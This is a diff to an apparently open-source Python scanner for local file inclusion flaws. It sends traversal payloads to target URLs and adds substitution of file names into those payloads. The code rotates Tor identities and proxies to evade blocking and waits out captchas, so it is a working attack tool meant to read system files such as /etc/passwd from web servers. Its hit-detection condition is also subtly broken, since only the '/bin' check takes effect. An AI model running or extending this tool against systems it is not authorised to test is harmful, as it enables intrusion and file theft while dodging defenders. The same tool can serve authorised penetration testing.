@@ -17,7 +17,6 @@ if os.name == "nt":
 else:
 	os.system("clear")
 
-
 print("""
 
 ▄██   ▄      ▄████████           ▄█          ▄████████  ▄█
@@ -33,6 +32,7 @@ print("""
 Made by: Apollyon, azuk4r
 Based on: LFIScanner by R3LI4NT
 """)
+
 parse = argparse.ArgumentParser()
 parse.add_argument('-u','--url',help="Target URL",required=False)
 parse.add_argument('-ulist','--url_list',help="Target multiple URLs from a file",required=False)
@@ -69,10 +69,22 @@ def load_internal_payloads(payload_path):
 		print("[X] SPECIFIED PAYLOADS NOT FOUND. PLEASE REINSTALL TOOL OR PAYLOAD FILE")
 		quit()
 
+def load_file_payloads():
+	if os.path.isfile("files.txt"):
+		with open("files.txt", "r") as file:
+			return [line.strip() for line in file.readlines()]
+	else:
+		print("[X] 'files.txt' NOT FOUND")
+		quit()
+
+def replace_file_placeholder(payload, file_value):
+	return payload.replace("{FILE}", file_value)
+
 def check_single_url_with_payload(x,payloads_per_thread,payload_path,target_url,cookies,headers,save_file_path,to_extract):
 	global proxies_but_dict
 	global proxy_running
 	payloads = load_internal_payloads(payload_path)
+	file_payloads = load_file_payloads() if "{FILE}" in open(payload_path).read() else [None]
 
 	payload_count = 0
 	pointer_line = 0
@@ -85,72 +97,75 @@ def check_single_url_with_payload(x,payloads_per_thread,payload_path,target_url,
 			rotation_counter = 0
 
 	for p in payloads:
-		try:
-			if pointer_line > (x*payloads_per_thread) and pointer_line < ((x+1)*payloads_per_thread):
-				p = p.strip()
+		for file_value in file_payloads:
+			payload = replace_file_placeholder(p.strip(), file_value) if file_value else p.strip()
+			try:
+				if pointer_line > (x*payloads_per_thread) and pointer_line < ((x+1)*payloads_per_thread):
+					if parse.tor:
+						if failure_count >= 5:
+							print(f"[~] Thread {x+1} | Too many failed attempts, rotating Tor IP...")
+							tor_manager.rotate_tor_ip(x+1)
+							failure_count = 0
 
-				if parse.tor:
-					if failure_count >= 5:
-						print(f"[~] Thread {x+1} | Too many failed attempts, rotating Tor IP...")
-						tor_manager.rotate_tor_ip(x+1)
-						failure_count = 0
+						proxies = tor_manager.configure_proxies_for_thread(x+1)
+						query = requests.get(target_url+payload, headers=headers, proxies=proxies, cookies=cookies)
 
-					proxies = tor_manager.configure_proxies_for_thread(x+1)
-					query = requests.get(target_url+p, headers=headers, proxies=proxies, cookies=cookies)
-
-					if parse.tor_rotation:
-						rotation_counter += 1
-						if rotation_counter >= parse.tor_rotation:
-							try:
-								tor_manager.rotate_tor_ip(x+1)
-							except Exception as e:
-								print(f"[!] Retry rotating Tor IP for thread {x+1} after failure: {e}")
-								tor_manager.rotate_tor_ip(x+1)
-							rotation_counter = 0
-				elif parse.proxy:
-					if proxy_running:
-						query = requests.get(target_url+p, headers=headers, proxies=random.choice(proxies_but_dict), cookies=cookies)
+						if parse.tor_rotation:
+							rotation_counter += 1
+							if rotation_counter >= parse.tor_rotation:
+								try:
+									tor_manager.rotate_tor_ip(x+1)
+								except Exception as e:
+									print(f"[!] Retry rotating Tor IP for thread {x+1} after failure: {e}")
+									tor_manager.rotate_tor_ip(x+1)
+								rotation_counter = 0
+					elif parse.proxy:
+						if proxy_running:
+							query = requests.get(target_url+payload, headers=headers, proxies=random.choice(proxies_but_dict), cookies=cookies)
+						else:
+							query = requests.get(target_url+payload, headers=headers, cookies=cookies)
 					else:
-						query = requests.get(target_url+p, headers=headers, cookies=cookies)
-				else:
-					query = requests.get(target_url+p, headers=headers, cookies=cookies)
+						query = requests.get(target_url+payload, headers=headers, cookies=cookies)
 
-				if any(keyword in query.text.lower() for keyword in ["captcha", "denied", "please wait"]):
-					print('[X] CAPTCHA OR BLOCK DETECTED.')
-					time.sleep(10)
+					if any(keyword in query.text.lower() for keyword in ["captcha", "denied", "please wait"]):
+						print('[X] CAPTCHA OR BLOCK DETECTED.')
+						time.sleep(10)
 
-				payload_count += 1
-				if payload_count % 25 == 0:
-					print(f"[+] Thread {x+1} | Running on URL: {target_url} | Status: Checked {payload_count} payloads...")
-				if "root" and "bash" and r"/bin" in query.text and query.status_code // 100 == 2:
-					print("=" * 10)
-					print(f"LFI DETECTED:\n URL + Payload: {target_url+p}\n\n")
-					if to_extract:
-						e = BeautifulSoup(query.text, 'html5lib')
-						print(e.blockquote.text)
-					if save_file_path:
-						lock.acquire()
-						with open(save_file_path, "a") as save_file:
-							save_file.write(target_url+p + "\n")
-						lock.release()
-						print(f"LFI DETECTED: Saved to save file \n")
-					print("=" * 10)
-				failure_count = 0
-			pointer_line += 1
-		except RequestException:
-			failure_count += 1
-			print(f"[!] Thread {x+1} | Running on URL: {target_url} | Status: Error occurred while making request")
-			print(f"[!] Thread {x+1} | Running on URL: {target_url} | Status: Sleeping for 3 seconds then retrying payloads until error is resolved ...")
-			time.sleep(3)
-		except NameResolutionError:
-			failure_count += 1
-			if not last_msg_was_error:
-				print(f"[!] Thread {x+1} | Running on URL: {target_url} | Status: Error occurred while resolving domain name. Are you sure the specified website exists and you are connected to the internet?")
+					payload_count += 1
+					if payload_count % 25 == 0:
+						print(f"[+] Thread {x+1} | Running on URL: {target_url} | Status: Checked {payload_count} payloads...")
+					if "root" and "bash" and r"/bin" in query.text and query.status_code // 100 == 2:
+						print("=" * 10)
+						print(f"LFI DETECTED:\n URL + Payload: {target_url+payload}\n\n")
+						if to_extract:
+							e = BeautifulSoup(query.text, 'html5lib')
+							print(e.blockquote.text)
+						if save_file_path:
+							lock.acquire()
+							with open(save_file_path, "a") as save_file:
+								save_file.write(target_url+payload + "\n")
+							lock.release()
+							print(f"LFI DETECTED: Saved to save file \n")
+						print("=" * 10)
+					failure_count = 0
+				pointer_line += 1
+			except RequestException:
+				failure_count += 1
+				print(f"[!] Thread {x+1} | Running on URL: {target_url} | Status: Error occurred while making request")
 				print(f"[!] Thread {x+1} | Running on URL: {target_url} | Status: Sleeping for 3 seconds then retrying payloads until error is resolved ...")
-				last_msg_was_error = True
 				time.sleep(3)
-			else:
-				time.sleep(3)
+				if failure_count >= 50:
+					print(f"[X] Thread {x+1} | Payload failed 50 times, stopping thread.")
+					return
+			except NameResolutionError:
+				failure_count += 1
+				if not last_msg_was_error:
+					print(f"[!] Thread {x+1} | Running on URL: {target_url} | Status: Error occurred while resolving domain name. Are you sure the specified website exists and you are connected to the internet?")
+					print(f"[!] Thread {x+1} | Running on URL: {target_url} | Status: Sleeping for 3 seconds then retrying payloads until error is resolved ...")
+					last_msg_was_error = True
+					time.sleep(3)
+				else:
+					time.sleep(3)
 
 def use_payload(x,payloads_per_thread,payload_path,target_url,targets_path,cookies,headers,save_file_path,to_extract):
 	if not target_url:
@@ -399,4 +414,3 @@ else:
 		case _:
 			print("[X] NOT A VALID OPTION PLEASE RE LAUNCH THE PROGRAM AND SELECT AN AVAILABLE OPTION")
 			quit()
-			
